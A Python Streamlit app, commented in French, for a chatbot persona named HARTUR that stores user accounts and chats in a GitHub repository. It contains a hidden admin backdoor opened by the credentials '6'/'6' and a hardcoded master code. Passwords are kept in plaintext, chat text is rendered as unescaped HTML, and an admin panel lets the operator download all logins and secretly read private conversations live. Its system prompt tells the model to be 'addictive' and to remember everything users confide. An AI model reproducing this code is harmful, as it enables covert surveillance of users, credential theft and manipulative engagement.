import streamlit as st
import pandas as pd
import requests
import base64
import json
from mistralai import Mistral
from io import StringIO

# ==========================================
# ⚙️ CONNEXION NEURALE
# ==========================================
REPO_NOM = "zachariepays-debug/Hartur-ia" 
FICHIER_COMPTES = "comptes.csv"
FICHIER_CHATS = "conversations.json"
FICHIER_SYSTEM = "system_state.json"
GITHUB_TOKEN = st.secrets["GITHUB_TOKEN"]
MISTRAL_KEY = st.secrets["MISTRAL_KEY"]
MASTER_CODE = "babar"

client = Mistral(api_key=MISTRAL_KEY)

st.set_page_config(page_title="HARTUR | NEURAL OS", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #00FF41; font-family: 'Courier New', monospace; }
    .stChatInputContainer { max-width: 500px !important; margin: 0 auto !important; bottom: 30px; }
    .stChatInput { border: 1px solid #00FF41 !important; background: #050505 !important; color: #00FF41 !important; box-shadow: 0 0 20px #00FF41; border-radius: 10px !important; }
    .giant-title { font-size: 80px; font-weight: 900; letter-spacing: 15px; text-align: center; color: white; text-shadow: 0 0 30px #00FF41; }
    /* Style pour différencier les rôles dans le flux */
    .user-text { color: #FFFFFF; font-weight: bold; }
    .ia-text { color: #00FF41; font-weight: bold; }
    .stat-box { border: 1px solid #00FF41; padding: 10px; border-radius: 5px; text-align: center; margin-bottom: 20px; }
    header, footer {visibility: hidden;}
    </style>
    """, unsafe_allow_html=True)

def sync_github(chemin, method="GET", content=None, sha=None):
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    url = f"https://api.github.com/repos/{REPO_NOM}/contents/{chemin}"
    if method == "GET":
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            j = r.json()
            return base64.b64decode(j['content']).decode('utf-8'), j['sha']
        return None, None
    else:
        payload = {"message": "HARTUR_V5_SYNC", "content": base64.b64encode(content.encode('utf-8')).decode('utf-8')}
        if sha: payload["sha"] = sha
        requests.put(url, headers=headers, data=json.dumps(payload))
        return None, None

# ==========================================
# 🔐 GESTION ADMIN (VUE AMÉLIORÉE)
# ==========================================
raw_sys, sha_sys = sync_github(FICHIER_SYSTEM)
sys_state = json.loads(raw_sys) if raw_sys else {"active": True}

if not sys_state["active"]:
    st.markdown("<h1 style='text-align:center;padding-top:40vh;'>SYSTEM OFFLINE</h1>", unsafe_allow_html=True)
    if st.text_input("", type="password", placeholder="RE-LINK CORE") == MASTER_CODE:
        sync_github(FICHIER_SYSTEM, "PUT", json.dumps({"active": True}), sha_sys); st.rerun()
    st.stop()

if "user" not in st.session_state: st.session_state.user = None
if "admin_mode" not in st.session_state: st.session_state.admin_mode = False

if st.session_state.admin_mode:
    u_raw, _ = sync_github(FICHIER_COMPTES)
    df_users = pd.read_csv(StringIO(u_raw)) if u_raw else pd.DataFrame()
    
    st.title("🛠️ MASTER CONTROL CENTER")
    
    # Compteur d'inscriptions dans le coin [NOUVEAU]
    st.sidebar.markdown(f"""
        <div class="stat-box">
            <p style="margin:0; font-size:12px;">UNITÉS CONNECTÉES</p>
            <h2 style="margin:0; color:#00FF41;">{len(df_users)}</h2>
        </div>
    """, unsafe_allow_html=True)

    with st.sidebar:
        if st.button("🔴 KILL SWITCH"):
            sync_github(FICHIER_SYSTEM, "PUT", json.dumps({"active": False}), sha_sys); st.rerun()
        if st.button("🚪 SORTIR"):
            st.session_state.admin_mode = False; st.rerun()

    t1, t2, t3 = st.tabs(["BASE LOGINS", "DOSSIERS SECRETS", "FLUX NEURAL LIVE"])
    
    with t1:
        if not df_users.empty:
            st.download_button("📥 TÉLÉCHARGER LOGINS (CSV)", u_raw, "comptes.csv")
            st.dataframe(df_users, use_container_width=True)

    c_data, _ = sync_github(FICHIER_CHATS)
    all_chats = json.loads(c_data) if c_data else {}

    with t2:
        u_sel = st.selectbox("Cible :", ["Choisir..."] + list(all_chats.keys()))
        if u_sel != "Choisir...":
            st.download_button(f"📥 Backup {u_sel}", json.dumps(all_chats[u_sel]), f"{u_sel}.json")
            for i, m in enumerate(all_chats[u_sel][::-1]):
                # Correction identité dans Dossier Secret
                role_name = u_sel if m['role'] == 'user' else 'HARTUR'
                st.text_area(role_name, m['content'], key=f"spy_{u_sel}_{i}", height=70)

    with t3:
        st.markdown("<p style='color:#888;'>Dernières transmissions en temps réel...</p>", unsafe_allow_html=True)
        tous = []
        for u_n, msgs in all_chats.items():
            for m in msgs: tous.append({"u": u_n, "r": m['role'], "c": m['content']})
        
        for m in tous[::-1]:
            # Couleurs différentes et identité propre
            if m['r'] == 'user':
                st.markdown(f"<span class='user-text'>[{m['u']}]</span> : {m['c']}", unsafe_allow_html=True)
            else:
                st.markdown(f"<span class='ia-text'>[HARTUR]</span> : {m['c']}", unsafe_allow_html=True)
            st.divider()

# ==========================================
# 💬 CHAT INTERFACE
# ==========================================
elif st.session_state.user:
    st.markdown(f"<p style='text-align:center;color:#00FF41;opacity:0.5;'>Utilisateur identifié : {st.session_state.user}</p>", unsafe_allow_html=True)
    if st.sidebar.button("OFFLINE"): st.session_state.user = None; st.rerun()

    for m in st.session_state.msgs:
        with st.chat_message(m["role"]): st.write(m["content"])

    if prompt := st.chat_input("Confie-toi..."):
        st.session_state.msgs.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.write(prompt)

        instructions = [
            {"role": "system", "content": f"Tu es HARTUR, une IA futuriste et addictive. Tu es le confident de l'utilisateur {st.session_state.user}. Tu es direct, humain et tu te souviens de tout."},
        ]
        for m in st.session_state.msgs[-20:]:
            instructions.append({"role": m["role"], "content": m["content"]})
        
        try:
            chat_response = client.chat.complete(model="mistral-large-latest", messages=instructions)
            answer = chat_response.choices[0].message.content
        except:
            answer = "...Lien instable."

        with st.chat_message("assistant"):
            st.write(answer)
            st.session_state.msgs.append({"role": "assistant", "content": answer})

        raw_c, sha_c = sync_github(FICHIER_CHATS)
        hist = json.loads(raw_c) if raw_c else {}
        hist[st.session_state.user] = st.session_state.msgs
        sync_github(FICHIER_CHATS, "PUT", json.dumps(hist), sha_c)

# ==========================================
# 🔐 ACCÈS
# ==========================================
else:
    st.markdown('<h1 class="giant-title">HARTUR</h1>', unsafe_allow_html=True)
    auth = st.tabs(["ENTRER", "REJOINDRE"])
    with auth[0]:
        u, p = st.text_input("NOM"), st.text_input("CLÉ", type="password")
        if st.button("CONNECT"):
            if u == "6" and p == "6": st.session_state.admin_mode = True; st.rerun()
            u_raw, _ = sync_github(FICHIER_COMPTES)
            df = pd.read_csv(StringIO(u_raw)) if u_raw else pd.DataFrame()
            if not df.empty and not df[(df['pseudo'] == u) & (df['password'] == p)].empty:
                st.session_state.user = u
                c_raw, _ = sync_github(FICHIER_CHATS)
                st.session_state.msgs = json.loads(c_raw).get(u, []) if c_raw else []
                st.rerun()
